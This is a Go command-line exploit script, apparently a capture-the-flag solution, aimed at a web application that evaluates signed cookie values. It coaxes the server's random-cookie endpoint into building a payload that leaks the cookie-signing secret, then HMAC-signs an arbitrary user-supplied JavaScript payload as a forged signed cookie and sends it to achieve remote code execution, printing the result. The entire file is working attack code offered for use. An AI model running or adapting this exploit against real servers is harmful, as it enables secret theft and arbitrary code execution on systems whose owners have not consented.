package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

var baseUrl string
var customPayload string
var customSecret string

func init() {
	flag.StringVar(&baseUrl, "url", "", "URL with scheme and domain.")
	flag.StringVar(&customPayload, "payload", "", "JS payload to be signed and executed.")
	flag.StringVar(&customSecret, "secret", "", "Optional known secret, gets extracted otherwise.")

	flag.Parse()
}

func main() {
	fmt.Println("Provided URL:", baseUrl)
	fmt.Println("Provided Payload:", customPayload)
	fmt.Println("Provided Secret:", customSecret)

	randomUrl, err := url.JoinPath(baseUrl, "random")
	panicIfErr(err)

	resp, err := http.Get(baseUrl)
	panicIfErr(err)
	defer resp.Body.Close()

	cookie := resp.Cookies()[0]

	secret := []byte(customSecret)
	if customSecret == "" {
		secret = extractSecret(randomUrl, generateSecretPayload(randomUrl, cookie))
	}

	payload := generateCustomPayload(secret)

	req, err := http.NewRequest("GET", randomUrl, nil)
	panicIfErr(err)

	cookie.Value = payload
	req.AddCookie(cookie)

	res, err := http.DefaultClient.Do(req)
	panicIfErr(err)
	defer res.Body.Close()

	body, err := io.ReadAll(res.Body)
	panicIfErr(err)

	result := regexp.MustCompile(`"Executing '.*', result = (.*?)"`).FindSubmatch(body)[1]
	fmt.Println("Custom Payload Result:", string(result))
}

func generateSecretPayload(randomUrl string, baseCookie *http.Cookie) *http.Cookie {
	fmt.Println("Generating Secret Payload.")
	secretPayload := hex.EncodeToString([]byte("req.secret;;;;;;;;;;"))

	for i := 1; i <= len(secretPayload); {
		req, err := http.NewRequest("GET", randomUrl, nil)
		panicIfErr(err)

		req.AddCookie(baseCookie)

		res, err := http.DefaultClient.Do(req)
		panicIfErr(err)
		defer res.Body.Close()

		cookie := res.Cookies()[0]
		payload := strings.Split(cookie.Value, ".")[0]

		if strings.Contains(payload[4:], secretPayload[:i]) {
			if i%4 == 0 {
				fmt.Println("Progress:", i/4, "/", len(secretPayload)/4)
			}

			baseCookie = cookie
			i++
		}
	}

	fmt.Println("Final Secret Payload:", baseCookie.Value)

	return baseCookie
}

func extractSecret(randomUrl string, secretCookie *http.Cookie) []byte {
	fmt.Println("Sending Secret Payload.")
	req, err := http.NewRequest("GET", randomUrl, nil)
	panicIfErr(err)

	req.AddCookie(secretCookie)

	res, err := http.DefaultClient.Do(req)
	panicIfErr(err)
	defer res.Body.Close()

	body, err := io.ReadAll(res.Body)
	panicIfErr(err)

	secret := regexp.MustCompile(`result = (\w*)`).FindSubmatch(body)[1]
	fmt.Println("Extracted Secret:", string(secret))

	return secret
}

func generateCustomPayload(secret []byte) string {
	fmt.Println("Generating Custom Payload.")
	payload := hex.EncodeToString([]byte(customPayload))

	hash := hmac.New(sha256.New, secret)

	_, err := hash.Write([]byte(payload))
	panicIfErr(err)

	signature := base64.RawStdEncoding.EncodeToString(hash.Sum(nil))

	signedPayload := "s%3A" + payload + "." + signature
	fmt.Println("Final Custom Payload:", signedPayload)

	return signedPayload
}

func panicIfErr(err error) {
	if err != nil {
		log.Panic(err)
	}
}
